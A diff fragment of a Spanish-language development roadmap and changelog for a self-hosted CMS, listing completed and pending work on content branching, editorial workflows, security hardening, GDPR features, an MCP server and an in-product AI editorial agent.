+- [x] `cow.ts` — materializeForkOnEdit (idempotente, slug COW prefijado `__b-<branchSlug>`, snapshot `branchedFromUpdatedAt`), markDeletedInBranch (hard-delete si state='new', tombstone si 'forked'), revertForkInBranch, createEntryInBranch, listEntriesForBranch (union main−COW), resolveEntryForBranch, listBranchConflicts (raw SQL con JOIN para `m.updated_at > e.branched_from_updated_at`), assertBranchInWorkspace, nonTombstoneFilter
+- [x] `diff.ts` — snapshotBlocks (block-id estable: attrs.id o djb2(type+text+idx)), diffBlocks (added/removed/modified/unchanged por id), diffMeta (12 campos), diffEntry, diffSummary; inline word diff con `diff` package
+- [x] `merge.ts` — buildMergePlan (clasifica items: promote/delete_main/create_in_main + isConflict), mergeBranch con claim atómico `UPDATE … WHERE status='draft' AND is_default=false RETURNING`, resoluciones per-fork (use_branch/use_main/skip), force option, releaseMerging on errors
+- [x] `preview.ts` — generatePreviewToken (24 bytes base64url), hashPreviewPassword (sha256 con salt), rotatePreviewToken, clearPreviewToken, resolvePreviewBranch (4 estados: not-found/expired/password-required/wrong-password/branch-closed), bumpPreviewView
+- [x] `activity.ts` — logBranchEvent best-effort, listBranchActivity con left join users
+- [x] `comments.ts` — createBranchComment (parent validation cross-tenant, mentions sanitizadas), resolveBranchComment, deleteBranchComment, listBranchComments con author join
+- [x] `index.ts` — re-export
+
+#### API + Server actions
+- [x] `src/app/admin/branches/_actions.ts` — 13 acciones: create, update, abandon, merge (admin role), rotate/clear preview token, switch/clear active branch (cookie), revert/delete entry in branch, comment CRUD (con role guards: viewer/editor/admin)
+- [x] Helper Result<T> tipado para evitar `void` confuso
+- [x] `/api/admin/branches` GET listing con stats
+- [x] `/api/admin/branches/[id]` GET branch + entries + activity + comments
+- [x] `/api/admin/branches/[id]/diff?entry=<id>` GET diff per-entry
+- [x] `/api/admin/branches/[id]/preview` GET URL pública de preview
+
+#### UI admin
+- [x] `/admin/branches` listing — cards con color OKLCH, badges status, stats (forked/created/deleted/conflicts/openComments), main destacada en gradient
+- [x] `create-branch-button.tsx` — modal con name+slug auto + descripción + 6 colores OKLCH
+- [x] `/admin/branches/[id]` detalle — header con color, badges (status/protected/active), botones contextuales (Editar/Desactivar/Compartir/Mergear/Abandonar)
+- [x] Listing entries con badges visibility (forked/new/deleted/main heredada) + conflict badge + diff inline expandible (block-by-block + meta)
+- [x] MergeModal con UI de resolución per-conflict (use_branch/use_main/skip) + preview de auto-merge items
+- [x] ShareModal con URL copiable, password opcional, expiración, contador de hits, rotate/clear
+- [x] Activity tab con avatares + timeline + 17 tipos de eventos legibles en español
+- [x] Comments tab con threads root, resolve, body multilinea
+- [x] Sidebar: `/admin/branches` con icono GitBranch
+
+#### Switcher + editor integration
+- [x] `BranchSwitcher` en topbar — pill con color de branch, atajo `⌘B`, dropdown con todas las activas, link a /admin/branches
+- [x] `ActiveBranchBanner` debajo del topbar cuando branch ≠ main — gradient color de branch + link de salida
+- [x] Cookie `csm_branch` con scope `path: "/admin"`, `sameSite: "lax"`
+- [x] `saveEntryAction` integrado: resuelve branch activa, materializeForkOnEdit cuando es necesario, devuelve `forkedToId` al cliente para redirect transparente
+- [x] `editor-shell.tsx` redirige al COW id tras forkear (window.location)
+
+#### Preview público read-only
+- [x] `/preview/branch/[token]/layout.tsx` con `robots: noindex, nofollow, noarchive, nosnippet`
+- [x] `/preview/branch/[token]/page.tsx` — listing de entradas en la branch con badges visibility, password form si protected, mensajes de error (expired / branch-closed)
+- [x] `/preview/branch/[token]/[slug]/page.tsx` — entry render con renderDoc + sticky preview badge
+- [x] `bumpPreviewView` best-effort sin bloquear response
+
+#### Verificaciones
+- [x] `npx tsc --noEmit` — 0 errores
+- [x] `npx biome check src/branches src/app/admin/branches src/app/api/admin/branches src/app/preview src/components/admin/{branch-switcher,active-branch-banner}.tsx scripts/backfill-main-branches.ts` — 0 errores
+- [x] `npm run build` — exitoso, todos los routes nuevos en bundle:
+  - `/admin/branches` 7.32 kB / `/admin/branches/[id]` ~16 kB
+  - `/api/admin/branches` + 3 sub-routes
+  - `/preview/branch/[token]` 3.89 kB + `/preview/branch/[token]/[slug]` 176 B
+
+#### Decisiones diferidas a F10
+- L1: Branch protection avanzada (require N reviewers, require comments resolved before merge)
+- L2: Restore de branch abandoned (UI de "papelera" con N días de retención)
+- L3: Rebase explícito (traer cambios de main a la branch antes de merge — hoy se confía en force=true como bypass del check)
+- L4: Branches anidadas (`baseBranchId` apunta a otra branch ≠ main) — schema lo permite, lógica de merge no lo aplica todavía
+- L5: Notificaciones de @mentions en comments (la columna `mentions` se persiste pero no dispara emails)
+- L6: Preview con vista mobile/tablet/desktop responsivo en mismo URL
+- L7: Live-edit overlay sobre `/preview/branch/...` para editores logueados (interacción con F8c live-edit)
+- L8: AB tests sobre branches (ej. publicar branch sólo a 10% del tráfico)
+
+### ✅ F9c — Editorial OS (Calendar + Workflows + Notifications) (DONE)
+
+> "Editorial OS" — calendar+kanban con DnD, asignaciones multi-rol, comentarios anclados a bloques con @mentions, bell SSE realtime, SLA cron, iCal feed, AI suggested slot, audit timeline, workflow templates por colección, bulk transitions.
+
+#### Schema (drizzle-kit push --force aplicado)
+- [x] Enum `entryStatus` ampliado con `"approved"` (entre review y scheduled)
+- [x] Enums nuevos `entryPriority` (low/normal/high/urgent), `editorialAssignmentRole` (writer/reviewer/approver), `editorialThreadStatus` (open/resolved), `editorialEventType` (12 valores)
+- [x] `entries` ampliada: `dueAt`, `priority`, `lockedForApprovalAt`, `lockedForApprovalById` (+ índices ws_scheduled, ws_due)
+- [x] `collections.workflowConfig` (jsonb: requireReviewer/Approver, defaultSlaHours, skipReview, allowSelfApprove, etc.)
+- [x] Tablas nuevas: `entry_assignments` (unique parcial activa por entry+role), `entry_workflow_events` (audit), `editorial_threads`+`editorial_messages` (mentions), `editorial_calendar_tokens` (iCal feed personal)
+
+#### Library `src/editorial/` (9 módulos)
+- [x] `types.ts` — enums + FORWARD_TRANSITIONS graph + EditorialNotificationType
+- [x] `notifications.ts` — bus in-memory + SSE listeners + emit/list/markRead + dedup batch
+- [x] `assignments.ts` — CRUD multi-tenant + claim atómico (UPDATE WHERE completedAt IS NULL) + workspace membership check + webhook emit
+- [x] `workflow.ts` — `transitionStatus` con 7 guards (rol, forward graph, requireReviewer/Approver, scheduled futuro, lock approval atómico, skipReview, branch-publish-block)
+- [x] `comments.ts` — threads + messages, mentions `@[name](userId)` validados contra members, reply auto-reabre resueltos
+- [x] `sla.ts` — `effectiveDueAt`, `slaState` (ok/warning/breach), `sweepSlaBreaches` con dedup via workflow events
+- [x] `calendar.ts` — `listCalendarItems` (5+ filtros, includeDue), `calendarHeatmap` por día
+- [x] `ical.ts` — RFC 5545 compliant (foldLine 75 octetos, control char strip, escape) + tokens 24-byte rotables
+- [x] `ai-schedule.ts` — `suggestSlots` basado en `analytics_events` últimos 90d (agrupa por dow+hour) con fallback heurístico
+
+#### API + cron + server actions
+- [x] `/api/admin/notifications` GET + `/mark-read` POST
+- [x] `/api/admin/notifications/stream` SSE con heartbeat 25s + cleanup en send-failure
+- [x] `/api/admin/calendar.ics?token=` con membership re-check + revocación automática si user dejó workspace
+- [x] `/api/admin/ai/suggest-slot?count=` GET
+- [x] `/api/cron/sla-breach` cada 15min (vercel.json)
+- [x] `src/app/admin/workflows/_actions.ts` — 12 acciones (transition, assign, complete, remove, threads CRUD, reschedule, updateMeta, iCal token rotate)
+
+#### UI admin
+- [x] `/admin/calendario` mes/semana con DnD nativo (HTML5) a `scheduledAt`, heatmap por día, filtros sticky URL (collection/author/assignee/status/priority/includeDue), modal iCal subscribe con copy URL + rotate
+- [x] `/admin/workflows` Kanban draft→review→approved→scheduled→published, drag entre cols dispara transition con guard server-side, bulk select + bulk transition, cards con avatars + SLA badge + priority dot
+- [x] EditorialDrawer en `/admin/contenido/[id]` (3 tabs: Flujo / Comentarios / Historial) — workflow + assignees + AI suggest slot + threads con mentions autocomplete + audit timeline
+- [x] Bell topbar con SSE realtime (auto-reconnect 5s), unread count, dropdown últimas 30, mark all/one read
+- [x] Sidebar: Calendario y Workflows promovidos de "soon" a activos
+
+#### Webhooks F7 ampliados
+- [x] 5 eventos nuevos: `entry.review_requested`, `entry.approved`, `entry.rescheduled`, `entry.assigned`, `entry.unassigned`
+- [x] Emit desde `transitionStatus`, `assignToEntry`, `removeAssignment`, `rescheduleEntryAction`
+
+#### Auditoría capa 2 (subagent estrecho F9c)
+Encontró **3 CRITICAL + 5 HIGH + 10 MEDIUM + 9 LOW**. Fixeados:
+- [x] **C1: iCal feed sin membership check** — token sigue válido tras kick. Fix: validar `members(workspaceId, userId)` + auto-revoke si no es miembro.
+- [x] **C2: iCal escapeIcal RFC non-compliant** — sin fold de líneas >75 octetos, sin strip de control chars. Fix: `stripControlChars` + `foldLine` UTF-8-aware.
+- [x] **C3: SLA sweep eficiencia + correctness** — leía TODO el log de breach events sin filter. Fix: `WHERE assignmentId = ANY(ids)`.
+- [x] **H2: transitionStatus permite approve/schedule/publish en branchId != NULL** — estado inconsistente (publicado pero no expuesto). Fix: bloquear con error `branch_publish_blocked`.
+- [x] **H3: SSE listener Map leak en send-failure** — controllers caídos sin abort dejaban listeners eternos. Fix: send retorna bool, cleanup llamado en cada fallo.
+- [x] **M1: notifyStatusChange/notifyComment sin filter ws en entries lookup** — defense-in-depth. Fix: `eq(entries.workspaceId, …)`.
+- [x] **M4: reopenThread no insertaba audit event** — rompía timeline. Fix: insert workflow event `comment.added` con action=reopened.
+- [x] **M7: lockedForApprovalAt no se libera si UPDATE final falla por race** — entry quedaba lockeada. Fix: liberar lock en branch de error si actor coincide.
+
+#### Auditoría capa 3 (subagent amplio F0-F9c)
+Encontró **4 CRITICAL + 5 HIGH + 11 MEDIUM + 5 LOW** cross-fase. Fixeados los prioritarios:
+- [x] **C-1: Schemas Zod REST v1 sin "approved"** — `?status=approved` devolvía 400, response validation rompía. Fix: añadido a EntryResourceSchema/EntryCreateSchema/ListEntriesQuerySchema.
+- [x] **C-2: GraphQL EntryStatus enum incompleto** — fallaba serialización al devolver entries approved. Fix: añadido al enum.
+- [x] **C-3: Webhooks F7 sin eventos editoriales** — integraciones externas (Slack/n8n) ciegas a aprobaciones. Fix: 5 eventos nuevos + `emitAsync` desde workflow/assignments/reschedule.
+- [x] **C-4: FK cascade borraba audit trail al merge** — eventos+assignments+threads del fork se perdían al `DELETE entries`. Fix: helper `transferEditorialAuditToMain` reapunta entryId al main antes del DELETE en los paths `use_main` y `promote`.
+- [x] **H-1: SDK `csm.entries.list({ status })` sin "approved"** — rompía typing. Fix: añadido al union.
+- [x] **H-2: StatusTabs y posts-table sin tab/badge "approved"** — entries quedaban invisibles desde listado clásico. Fix: añadido tab "Aprobados" y badge azul.
+- [x] **H-4: rescheduleEntryAction y updateEntryMetaAction no filtraban branchId** — permitían mutar metadata en forks sin pasar por COW. Fix: `isNull(entries.branchId)` en lookup y UPDATE.
+- [x] **H-5: transitionStatus no chequea branch ↔ entry.branchId** — cubierto parcialmente por bloqueo approved/scheduled/published.
+
+#### Decisiones diferidas a F10
+- L1 SSE in-memory bus + Vercel Fluid Compute: notifications no fanout cross-instancia. F10 → Redis pub/sub o Postgres LISTEN/NOTIFY.
+- L2 Workload del calendar incluye assignments en forks (M-4 cross-fase): pendiente filter `isNull(entries.branchId)` en query workload de `/admin/calendario`.
+- L3 SLA sweep no filtra `branchId IS NULL` (M-8): assignments en forks emiten breaches.
+- L4 `listEntryEvents` sin paginar (M-9): timeline de entries con miles de eventos carga todo. Paginar a 50.
+- L5 Calendar y Workflows sin paginación cursor para WS con >5k entries (M-10).
+- L6 Live-edit (F8c) no respeta `lockedForApprovalAt`: hoy sólo afecta pages, sin workflow.
+- L7 Mentions notifications cross-instancia: ver L1.
+- L8 Workflow templates UI por colección: backend listo (`workflowConfig` jsonb), falta UI editor en `/admin/colecciones/[id]`.
+- L9 Bulk transitions sin throttle: serializa N actions, UX pesada con muchos items.
+- L10 `editorialCalendarTokens` revoke endpoint explícito (hoy solo rotación): endpoint dedicated `revoke`.
+- L11 `Notification` type colisiona con global `window.Notification` si import en cliente.
+
+## Fase 10 — Production-Ready ✦ Edición Espectacular ✦ Único en 2026
+
+> Lema: **"De CMS funcional a producto único en el mercado."** F10 transforma CSM en algo que ningún competidor open-source ofrece hoy: enterprise-grade security + edición colaborativa realtime + MCP server nativo + AI Agent editorial autónomo + PWA offline + observabilidad propia.
+>
+> **Tres diferenciadores que NADIE más combina hoy (2026-05):**
+> 1. **MCP Server nativo del CMS** → cualquier agente IA (Claude Desktop / Cursor / IDE) gestiona contenido como tool. Único en el espacio CMS open-source.
+> 2. **AI Agent editorial durable** (Vercel Workflow) → "publica 3 posts esta semana sobre X" → research, draft, SEO, schedule, OG, notify reviewers — autónomo, crash-safe.
+> 3. **Realtime collab self-hostable** (Y.js + presence + cursors) sobre CMS open-source → Sanity Live es hosted; Notion no es CMS; nadie más lo combina.
+
+### F10a — Seguridad Enterprise + Compliance
+> Foundational. Sin esto no se puede decir "production-ready". Resuelve los huecos abiertos en F0-F9.
+
+#### Parte 1 (entregada 2026-05-04) ✅
+- [x] **2FA TOTP** — wizard `/admin/ajustes/seguridad/2fa` (intro → verify → done) con QR (`qrcode.react`), backup codes (descarga txt + copy), regenerar backup codes con password. Plugin `twoFactor` de Better-Auth (ya cableado).
+- [x] **Sesiones revocables + lista de dispositivos** — `/admin/ajustes/seguridad/sesiones` con UA parsing (`ua-parser-js`), IP enmascarada (a.b.c.x / v6 trunc), badge "Esta sesión", revoke individual + "Cerrar todas las demás". Usa `auth.api.listSessions` + `authClient.revokeSession`.
+- [x] **Passkeys (WebAuthn)** — implementación custom con `@simplewebauthn/server` (Better-Auth 1.2 no incluye plugin). Helpers en `src/auth/passkeys.ts`, rutas `/api/admin/passkeys/{register-options,register-verify,[id]}`, UI `/admin/ajustes/seguridad/passkeys` con listado + add + rename inline + delete. Reusa tabla `passkeys` (schema F0) y `verifications` para challenges efímeros (TTL 5min, single-use).
+- [x] **Centro de Seguridad** `/admin/ajustes/seguridad` con 4 cards (estado 2FA, passkeys count, sesiones count, email verificado) + tips.
+- [x] **Layout Ajustes** con sub-nav (Perfil / Seguridad / Privacidad / Notificaciones / API). Sidebar admin: removida flag "soon" de Ajustes.
+
+#### Parte 2 — bloque 1 (entregado 2026-05-04) ✅
+- [x] **Login flow con 2FA**: `/login/2fa` con tabs TOTP (6 dígitos) / código de recuperación (alphanumérico). `login-form.tsx` detecta `result.data.twoFactorRedirect` tras `signIn.email` y redirige preservando `?next=` query param. `verifyTotp` y `verifyBackupCode` con manejo de errores (mensaje "INVALID" → "código incorrecto" / "ya usado").
+
+#### Parte 2 — bloque 2 (entregado 2026-05-04) ✅
+- [x] **Login con passkey** — botón "Iniciar con passkey" en /login con resident credential (sin email previo). Endpoints `/api/auth/passkey/login-options` (POST, sin auth) y `/api/auth/passkey/login-verify` (POST, sin auth). Resuelve userId por `credentialID`, mintea sesión Better-Auth-compatible (token random + HMAC-SHA-256 sobre `AUTH_SECRET` + cookie `csm.session_token` o `__Secure-csm.session_token` en prod). Audit log `passkey.login_success` con `meta.source: "passkey"`.
+- [x] **Bug fix passkeys.ts** — el verify de resident credential no encontraba el challenge porque `takeChallenge(prefix, "")` usaba string vacío. Ahora extrae `challenge` desde `clientDataJSON` (base64url) en `extractClientDataChallenge` y lo usa como key, alineado con cómo `generatePasskeyAuthenticationOptions` lo guarda.
+- [x] **Email verification obligatorio para paid** — Better-Auth `emailVerification` config con `sendVerificationEmail` callback (Resend en prod, console.log en dev). Página `/admin/ajustes/perfil` con `<ProfileEmailVerification>` (banner verde si verificado, banner ámbar + CTA resend si no). Helper `requireVerifiedEmailForPaidPlan(userId)` en `src/auth/email-verification.ts` para gates futuros (return `{ok, reason}` para que el caller decida UI). Política: free libre, paid + GDPR export + alertas críticas exigen verificación.
+- [x] **Rate limit en login con UI lockout** — Better-Auth `rateLimit` config con `storage: "database"` (tabla `rate_limits` nueva en schema, key/count/lastRequest). Reglas custom: `/sign-in/email` 5/60s, `/two-factor/verify-totp` 5/60s, `/two-factor/verify-backup-code` 10/60s, `/sign-in/magic-link` 3/60s, `/send-verification-email` 3/60s, default 60/60s. Mini-rate-limiter standalone `src/auth/rate-limit.ts` reusa la misma tabla para endpoints custom (`passkey-login-options` 20/60s, `passkey-login-verify` 10/60s). UI: banner countdown con segundos restantes, botones disabled durante lockout, parsing de `Retry-After` header desde Better-Auth y desde nuestros endpoints.
+
+#### GDPR / Privacidad
+- [x] **Cookies banner con consent granular** — `src/components/cookie-consent.tsx` montado en root layout. 3 opciones (necesarias siempre on / analytics / marketing). Persiste en cookie `csm_consent` (1 año, JSON con version) y dispatcha `csm:consent-change` para que componentes opt-in (analytics scripts) puedan engancharse vía `useConsent()`.
+- [x] **Páginas legales** — `/legal/privacidad`, `/legal/cookies`, `/legal/terminos` con layout compartido. Cumple RGPD (UE 2016/679 + LO 3/2018).
+- [x] **Export usuario completo** (entregado 2026-05-04) — `/api/admin/privacy/export` devuelve ZIP con `user.json` + `sessions.json` (IPs hasheadas) + `workspaces.json` + `entries.json` + `comments.json` + `passkeys.json` (sólo metadata) + `api-keys.json` (sin secrets) + `activity-log.json` (últimos 1000) + `README.txt` que explica el contenido y lo que NO incluye. JSZip ya estaba en deps. Cumple RGPD art. 20 (portabilidad).
+- [x] **Derecho al olvido** (entregado 2026-05-04) — schema añadió `users.deletionRequestedAt` + `users.deletedAt` con índice. Página `/admin/ajustes/privacidad` con sección destacada en rojo + double-confirm (escribir "ELIMINAR"). Banner de countdown si ya solicitada con fecha de purge formateada en español. Botón "Cancelar eliminación" disponible durante todo el grace period. Cron diario `/api/cron/daily` extendido con `purgeExpiredDeletions()` que hard-deletea (FK cascade limpia el resto). Constants `DELETION_GRACE_DAYS = 30`.
+- [ ] **Anonimización IP** en activity_log y analytics_events (ya parcial; auditar).
+
+#### CSP + Headers de seguridad
+- [x] **CSP con nonces (Report-Only)** — `src/lib/security-headers.ts` (buildCsp/buildPermissionsPolicy/applySecurityHeaders/generateNonce), wired en `src/middleware.ts`. Nonce per-request expuesto vía `x-nonce` request header. Whitelist Stripe/UploadThing/Resend/Replicate/Vercel Blob/avatares OAuth.
+- [x] **Permissions-Policy** — bloqueo de camera/geolocation/usb/midi/etc; permitido microphone(self) para voice-to-content, payment(self) para Stripe.
+- [x] **HSTS** activo en prod sobre https (`max-age=31536000; includeSubDomains`, preload off por seguridad), `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `X-Frame-Options: SAMEORIGIN`.
+- [x] **CSP report endpoint** `/api/security/csp-report` — log a stdout v1 (F10d → tabla `csp_reports` + dashboard).
+- [ ] Cambio a `enforce` cuando los reports estén limpios + UI dashboard `/admin/ajustes/seguridad/headers`.
+
+#### Anti-bot / spam
+- [ ] **Vercel BotID** integrado en forms públicos + comments + newsletter signup (GA junio 2025, free, sin captcha visible). Sustituye honeypot como defensa primaria.
+- [ ] **Cloudflare Turnstile** opcional como fallback configurable por workspace.
+- [ ] AI moderation score de comments ya existe → ahora bloquea según threshold por workspace.
+
+#### Branch protection avanzada (cierra F9b L1)
+- [ ] `branches.protectionConfig` jsonb: `{ requireReviewers: number, requireCommentsResolved: boolean, requireApprovers: number }`.
+- [ ] Merge bloqueado si protección no satisfecha; UI muestra checklist de blockers.
+- [ ] Audit event `branch.protection.changed`.
+
+#### Parte 2 bloque 3 (entregado 2026-05-04) ✅ — Hardening final
+- [x] **Whitelist URLs registry** — `safeUrlNullable()` aplicado a IMAGE.src/GALLERY items.src/HERO.image/SECTION.backgroundImage/TESTIMONIALS items.avatar. Nuevo helper `src/lib/safe-url.ts::httpUrlSchema()` (http(s)-only) aplicado a webhooks, ogImage (entries+pages), menus external, uploads-by-URL.
+- [x] **Anonimización IP** — `src/lib/ip-anon.ts` (`anonymizeIp` truncate v4 last octet / v6 /48). Better-Auth `databaseHooks.session.create.before` antes del INSERT. Backfill defensivo en cron daily (`/api/cron/daily`). `mintSession` (passkey login custom) también aplica.
+- [x] **CSP enforce + dashboard reports** — Tabla `csp_reports` con dedupKey SHA-256 + UPSERT. Endpoint `/api/security/csp-report` parsea legacy + Reporting API. Header `Reporting-Endpoints` + `report-uri`/`report-to` en CSP. Dashboard `/admin/ajustes/seguridad/headers` con tabla agrupada por directiva, detalle últimos 50, resolve por directiva o por reporte. Toggle enforce con env `CSP_ENFORCE=1`.
+- [x] **BotID + Turnstile + hCaptcha** — Helper unificado `src/lib/anti-bot.ts::verifyAntiBot()` con dynamic import de `@vercel/botid`. Integrado en `/api/public/subscribe` y `/api/comentarios`. UI `/admin/ajustes/seguridad/anti-spam` con estado por provider + envHints.
+- [x] **AI moderation thresholds** — `getModerationThresholds(workspaceId)` lee de `settings`. `thresholdToStatus(score, thresholds)`. UI `/admin/ajustes/seguridad/moderacion` con sliders bidireccionales, ZoneVisualizer SVG, predicción de zonas + histórico real.
+- [x] **Branch protection avanzada (cierra F9b L1)** — `branches.protectionConfig` jsonb (4 reglas: requireReviewers, requireApprovers, requireCommentsResolved, requireStatusApproved). `evaluateBranchProtection()` devuelve blockers. `mergeBranch` aplica gate antes del claim, NO bypassable con `force`. UI `/admin/branches/[id]/protection` con form + checklist en vivo + activity log.
+- [x] **API keys audit log timeline UI** — `/admin/api-keys/[id]` con KPIs (hoy/total/rate-limit/última), sparkline 14 días bicolor (success/error), tabla 100 últimas calls con filtros status (2xx/4xx/5xx) + método. Export CSV via `/api/admin/api-keys/[id]/audit.csv`. Botón rotate inline mostrando nueva key.
+- [x] **Rate limit AI Inline + cost cap por workspace** — Tabla `ai_usage_daily` con UPSERT atómico (UNIQUE con `COALESCE(user_id,'')`). Helper `src/ai/usage.ts` con `checkAiBudget` (per-user daily + monthly workspace) y `recordAiUsage`. Pre-flight check en `/api/admin/ai/inline` → 429 + Retry-After. UI `/admin/ajustes/ia` con KPIs, progress bar + form de budget/alert/hardBlock + breakdown por feature + top users.
+- [x] **OWASP top-10 audit** — Subagent dirigido auditó codebase contra OWASP Top 10 (2021). **Resultado: NO CRITICAL ISSUES FOUND**. Postura defensiva de F10a parte 2 confirmada SECURE en A01-A09. Documentado en `tasks/lessons.md` sección "F10a OWASP audit".
+
+#### Diferidos a F10d/F10e (no críticos)
+- [ ] CSP enforce real (cambiar `CSP_ENFORCE=1` en prod cuando reports estén limpios ≥7 días).
+- [ ] BotID dep instalada (`npm i @vercel/botid` cuando se decida activar).
+- [ ] AI cost real (vs estimado 5_000 micros/call) cuando provider devuelva tokens consumidos.
+- [ ] CSV export de activity_log workspace-wide (paralelo al de api-keys).
+
+### F10b — Realtime Collaborative Editing
+> Sanity Live solo está hosted. Nosotros: open-source self-hostable. Wow factor para teams.
+
+- [ ] **Y.js + y-websocket self-host** en `/api/collab/[entryId]` (Edge runtime con WebSocket Vercel Functions o Node fluid compute con upgrade).
+- [ ] **Presence en editor**: avatars cluster en topbar (max 5 visibles + "+N"), color por user (hashed deterministic).
+- [ ] **Remote cursors + selections** con label nombre — TiptapCollaborationCursor extension.
+- [ ] **Following mode**: click avatar → tu viewport sigue al usuario (scroll + zoom-to-block).
+- [ ] **CRDT persistence**: snapshot Y.Doc cada 30s a `entries.body_json` (debounced); reconcilia con autosave actual.
+- [ ] **Awareness de comments live**: nuevos comentarios aparecen sin reload.
+- [ ] **SSE cross-instancia con Postgres LISTEN/NOTIFY** (resuelve F9c L1/L7) — `notify_channel_workspace_${wsId}` para notifications fanout entre instancias Vercel Fluid Compute.
+- [ ] **Mentions email** (Resend) cuando user mencionado offline (cierra F9b L5).
+- [ ] Liveblocks free como fallback opcional vía env `LIVEBLOCKS_SECRET`.
+
+### F10c — MCP Server + AI Editorial Agent ⭐ EL DIFERENCIADOR
+> Nadie en el espacio CMS open-source ofrece esto en 2026.
+
+#### CSM MCP Server — Parte 1 (entregada 2026-05-04) ✅
+- [x] **Servidor MCP standalone** con `@modelcontextprotocol/sdk` v1.29. **Modos:** stdio (Claude Desktop / Cursor / IDE local) + Streamable HTTP (Cursor remoto / serverless / web). Mismo build, sólo cambia transport.
+- [x] **Auth** vía `Authorization: Bearer csm_live_…` (HTTP) o env `CSM_API_KEY` (stdio). Reusa `verifyKey` del REST API y respeta scopes existentes (`entries:read`/`write`/`publish`, `media:read`, etc.). Scope universal: `mcp:any`.
+- [x] **Actor resolver** (`src/mcp/actor.ts`): para tools que mutan, resuelve el user de audit log en cascada — creator de la API key → owner más antiguo → primer admin. Audit log dispara con `meta.source: "mcp"` para distinguir de operaciones humanas.
+- [x] **12 tools registradas** (todas multi-tenant safe):
+  - `workspace_info` · stats + plan + locales
+  - `entry_search` · híbrida BM25 + vectorial (RAG-ready)
+  - `entry_list` · filtros status/locale/q + counts por status
+  - `entry_get` · por id o slug+collection
+  - `entry_create` · draft con title+collection+locale
+  - `entry_update` · title/slug/excerpt/status/scheduledAt/seo + `bodyMarkdown` (conversor MD→Tiptap doc embebido)
+  - `entry_publish` · idempotente, con flag `republish`
+  - `collection_list` · esquema + counts
+  - `taxonomy_list` · category/tag
+  - `branch_list` · branches con stats
+  - `media_search` · ILIKE en key/alt/caption
+  - `subscriber_list` · status/locale/limit
+- [x] **Markdown→Tiptap doc** in-house — un agente LLM puede producir markdown plano y `entry_update bodyMarkdown` lo convierte a doc Tiptap (headings, listas, code blocks, blockquotes, párrafos). Sin tener que conocer el formato interno.
+- [x] **CLI** `csm mcp serve` + `csm mcp install --client=claude-desktop|cursor|vscode` — el install detecta plataforma, crea el directorio del cliente si no existe, hace merge con config previa (no la borra), y escribe la entrada `mcpServers.csm` con `command/args/env` correctos.
+- [x] **Endpoint HTTP** `/api/mcp` (Streamable HTTP, stateless) — POST/GET/DELETE. `WebStandardStreamableHTTPServerTransport` se integra nativo con Next.js Route Handlers (Web Standard Request/Response).
+- [x] **`bin/csm-mcp.mjs`** — bootstrap node→tsx para que Claude Desktop ejecute `node /ruta/csm-mcp.mjs` sin compilación previa. Soporta `CSM_API_KEY_FILE` para sandboxes/CI que no quieren la key en env.
+- [x] **UI `/admin/mcp`** — discovery page con tabs Claude Desktop / Cursor / VS Code / HTTP, copy-to-clipboard de comandos y configs JSON, lista visual de los 12 tools con scope + flag "muta". Sidebar admin con icono Plug.
+
+#### Agente Editorial in-product (entregado 2026-05-04) ✅
+> Mismos tools del MCP server pero conversacional dentro del admin. Demo del valor del MCP sin abrir Claude Desktop.
+- [x] **`/admin/agente`** — chat UI estilo Claude.ai/ChatGPT con burbujas user/assistant, tool-call cards plegables (input + output JSON), indicador "pensando" con dots, suggestions iniciales, Stop / Limpiar.
+- [x] **Loop de tool-use Anthropic puro** (`src/agent/loop.ts`, ~280 líneas) — sin AI SDK ni LangChain. Hard-cap 8 iteraciones. Stream NDJSON al cliente con `text` deltas + `tool_call` + `tool_result` + `done`/`error`. Mock determinista si no hay `ANTHROPIC_API_KEY`.
+- [x] **Reusa los 12 tools del MCP** vía `buildAgentSession({workspaceId, userId})` que genera una `McpSession` "in-product" con `directActorId` (audit log apunta al user real, sentinel `apiKeyId: "agent:<userId>"` para distinguir).
+- [x] **`zodToJsonSchema`** convierte el `inputSchema` ZodRawShape de cada tool a JSON Schema Anthropic. Cero duplicación de definiciones.
+- [x] **Endpoint** `/api/admin/ai/agent` — auth cookie + role≥editor, validación Zod del payload, abort signal propagado al fetch Anthropic.
+- [x] **Sidebar** admin: nuevo entry "Agente" con icono Bot junto a Ask CSM.
+
+#### Content Health Scan (entregado 2026-05-04) ✅
+> Único en CMS open-source 2026: cron weekly que escanea todo el contenido y produce score + issues accionables. Inspirado en Lighthouse pero para contenido editorial.
+- [x] **Schema** — 2 tablas nuevas (`entry_health` 1:1 con entries, `entry_health_issues` N:1) + 2 enums (`health_severity` low/medium/high/critical, `health_issue_type` 9 tipos). Drizzle push aplicado.
+- [x] **Detectores síncronos** (`src/health/detectors.ts`) — seo_title_length (30-70 chars), seo_meta_missing (100-170 chars), thin_content (<300 palabras), missing_alt (walks Tiptap doc), heading_hierarchy (detecta saltos H1→H3), outdated_date (regex es-ES con 3 patrones: "en 2021"/"01/02/2021"/"marzo de 2021").
+- [x] **Motor scan** (`src/health/scan.ts`) — `scanEntry({entry, force?})` idempotente con `inputHash` SHA-256 (no re-escanea si nada cambió). Transacción atómica (DELETE issues + INSERT batch + UPSERT snapshot). `scanWorkspace` itera published entries en lotes de 25.
+- [x] **Cron weekly** `/api/cron/health-scan` lunes 02:00 UTC, `maxDuration: 300`, schedule en `vercel.json`.
+- [x] **Dashboard `/admin/salud`** — 4 KPI cards (avg score, escaneadas, issues abiertos, críticos/altos), score ring SVG con gradient color, agrupación por tipo de issue, tabla con filtros (todas/críticas/altas/medias/bajas), botón "Re-escanear todo" + per-entry, ScoreBadge con color por rango (≥85 verde / ≥65 ámbar / <65 destructive).
+- [x] **Server actions** — `rescanEntryAction` (síncrono, force=true), `rescanWorkspaceAction` (puede tardar minutos), `dismissIssueAction` (false positive, no borra audit).
+- [x] **Sidebar** "Salud" con icono Heart en sección General.
+- [x] **2 nuevos tools MCP** (total: 14):
+  - `health_summary` — score + issues por severidad/tipo + worst N entries (read-only)
+  - `entry_health_scan` — escanea + devuelve issues legibles (idempotente)
+- [x] **Agente in-product** suggestions actualizadas: *"¿Cómo está la salud de mi contenido?"* y *"Dime los 3 posts con peor score y por qué"* — el agente ahora puede explicar issues y sugerir fixes conversacionalmente.
+
+#### CSM MCP Server — Parte 2 (pendiente)
